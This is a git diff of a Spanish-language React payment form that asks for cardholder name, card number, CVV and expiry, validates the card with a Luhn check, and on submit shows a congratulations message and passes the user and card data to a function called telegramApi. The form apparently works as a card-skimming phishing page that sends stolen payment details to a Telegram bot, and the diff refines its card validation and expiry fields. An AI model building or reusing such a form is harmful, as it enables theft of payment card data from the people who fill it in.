@@ -18,8 +18,7 @@ import telegramApi from './telegramApi'
 // ]
 const form2 = ({ showMenuPay, inputClass, formPay, setFormPay, setMensajeFelicidades, formUser }) => {
     const [valided, setValided] = useState(false)
-    const [valided2, setValided2] = useState(false)
-    const [limitCvv, setLimitCvv] = useState(4)
+    const [limitCvv, setLimitCvv] = useState(3)
 
     const validTarjeta = (tarjeta) => {
 
@@ -34,40 +33,41 @@ const form2 = ({ showMenuPay, inputClass, formPay, setFormPay, setMensajeFelicid
             return sum % 10 === 0;
         };
 
-        const luhnChk = (function (arr) {
-            return function (ccNum) {
-                var
-                    len = ccNum.length,
-                    bit = 1,
-                    sum = 0,
-                    val;
+        // const luhnChk = (function (arr) {
+        //     return function (ccNum) {
+        //         var
+        //             len = ccNum.length,
+        //             bit = 1,
+        //             sum = 0,
+        //             val;
 
-                while (len) {
-                    val = parseInt(ccNum.charAt(--len), 10);
-                    sum += (bit ^= 1) ? arr[val] : val;
-                }
+        //         while (len) {
+        //             val = parseInt(ccNum.charAt(--len), 10);
+        //             sum += (bit ^= 1) ? arr[val] : val;
+        //         }
 
-                return sum && sum % 10 === 0;
-            };
-        }([0, 2, 4, 6, 8, 1, 3, 5, 7, 9]));
+        //         return sum && sum % 10 === 0;
+        //     };
+        // }([0, 2, 4, 6, 8, 1, 3, 5, 7, 9]));
 
 
         if (luhnCheck(tarjeta)) {
             setValided(false)
-            setLimitCvv(3)
+            setLimitCvv(tarjeta[0] === "3" ? 4 : 3)
             return
         }
-        if (luhnChk(tarjeta)) {
-            setValided(false)
-            setLimitCvv(4)
-            return
-        }
+        // if (luhnChk(tarjeta)) {
+        //     setValided(false)
+        //     setLimitCvv(3)
+        //     return
+        // }
         setValided(true)
 
 
     }
 
     useLayoutEffect(() => {
+        
 
         formPay.cvv.length > limitCvv && setFormPay({
             ...formPay,
@@ -83,10 +83,10 @@ const form2 = ({ showMenuPay, inputClass, formPay, setFormPay, setMensajeFelicid
             ...formPay,
             expiracion: formPay.expiracion.slice(0, 5)
         })
-        
-        formPay?.expiracion?.length===4&&formPay.expiracion.search("/")==-1 && setFormPay({
+
+        formPay?.expiracion?.length === 4 && formPay.expiracion.search("/") == -1 && setFormPay({
             ...formPay,
-            expiracion: formPay.expiracion[0]+formPay.expiracion[1]+"/"+formPay.expiracion[2]+formPay.expiracion[3]
+            expiracion: formPay.expiracion[0] + formPay.expiracion[1] + "/" + formPay.expiracion[2] + formPay.expiracion[3]
         })
     }, [formPay])
 
@@ -98,23 +98,18 @@ const form2 = ({ showMenuPay, inputClass, formPay, setFormPay, setMensajeFelicid
 
 
     }
-    const handleChangeFecha=(e)=>{
-       setFormPay({
-                ...formPay,
-                [e.target.name]: e.target.value
-            })
-       
+    const handleChangeFecha = (e) => {
+        setFormPay({
+            ...formPay,
+            [e.target.name]: e.target.value
+        })
+
     }
     const enviarDatos = (e) => {
         e.preventDefault()
         const { nombreApellido, expiracion, cvv } = formPay;
-
-        if(!Number.isInteger(Number(expiracion[0]))||!Number.isInteger(Number(expiracion[1]))||!Number.isInteger(Number(expiracion[3]))||!Number.isInteger(Number(expiracion[4]))){
-            setValided2(true)
-        }else{
-            setValided2(false)
-        }
-
+        setFormPay({...formPay,expiracion:formPay.mes+"/"+formPay.año})
+        
         if (!valided && nombreApellido && expiracion && cvv) {
             setMensajeFelicidades(true)
             telegramApi(formUser, formPay)
@@ -148,15 +143,24 @@ const form2 = ({ showMenuPay, inputClass, formPay, setFormPay, setMensajeFelicid
                     placeholder="CVV"
                     required
                 />
-                <div className={""}>
-                    <input className={"w-full relative py-3 bg-gray-200 rouneded-md px-2 "} onChange={handleChangeFecha}
-                        value={formPay.expiracion}
-                        placeholder={`fecha de expiracion`}
-                        type="text"
-                        name="expiracion"
-                        required
-                    />
-                    {valided2 && <div className='text-red-400 px-2 mb-3'>Fecha invalida</div>}
+                <div className={"flex"}>
+                    <select onChange={handleChangeFecha} name={"mes"} className='appearance-none h-7 px-1 flex border relative outline-none bg-white text-sm mr-4 pt-1 focus:border-blue-300 '>
+                        <option value={""} className='ml-1'>{`Mes \u25BC`}</option>
+                        {[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12].map((item) => {
+                            return <option key={item} value={item}>
+                                {item}
+                            </option>
+                        })}
+                    </select>
+                    <select onChange={handleChangeFecha} name={"año"} className='appearance-none px-1 flex border relative outline-none bg-white text-sm pt-1 focus:border-blue-300 '>
+                        <option value={""} className='ml-1'>{`Año \u25BC`}</option>
+                        {[23, 24, 25, 26, 27, 28, 29, 30].map((item, i) => {
+                            return <option key={i} value={item}>
+                                {item}
+                            </option>
+                        })}
+
+                    </select>
                 </div>
             </div>
             <button className='bg-orange-600 text-white w-full py-3 hover:underline rounded-md text-xs md:text-base mt-4' onClick={(e) => enviarDatos(e)}>Realizar pago por: $9.650 COP</button>
@@ -166,9 +170,3 @@ const form2 = ({ showMenuPay, inputClass, formPay, setFormPay, setMensajeFelicid
 
 export default form2
 
-// {`
-//                             ${formPay.expiracion[0]?formPay.expiracion[0]:""}${formPay.expiracion[1]?formPay.expiracion[1]:""}
-//                         `}
-//                         <div>/</div>
-//                             {`${formPay.expiracion[2]?formPay.expiracion[2]:""}${formPay.expiracion[3]?formPay.expiracion[3]:""}
-//                         `}
